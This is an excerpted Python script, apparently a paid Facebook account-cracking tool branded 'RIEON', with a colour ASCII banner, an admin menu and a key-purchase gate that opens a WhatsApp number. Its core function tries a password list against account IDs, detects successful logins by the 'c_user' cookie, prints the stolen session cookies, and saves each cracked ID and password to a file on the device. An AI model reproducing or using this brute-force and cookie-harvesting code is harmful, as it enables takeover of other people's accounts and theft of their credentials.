...
\033[1;30m  .----------------.   .----------------. 
\033[1;31m | .--------------. | | .--------------. |
\033[1;32m | |  _______     | | | |  ____  ____  | |
\033[1;3m | | |_   __ \    | | | | |_   ||   _| | |
\033[1;34m | |   | |__) |   | | | |   | |__| |   | |
\033[1;35m | |   |  __ /    | | | |   |  __  |   | |
\033[1;36m | |  _| |  \ \_  | | | |  _| |  | |_  | |
\033[1;37m | | |____| |___| | | | | |____||____| | |
\033[1;38m | |              | | | |              | |
\033[1;39m | '--------------' | | '--------------' |
\033[1;40m  '----------------'   '----------------' 
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/RIEON-590');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRIEON-😪\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RIEON-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RIEON-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    if id in DARK:
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am RH ROBOT and my boss is  RIEON.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/+8801307737993")
        superuser()        
superuser()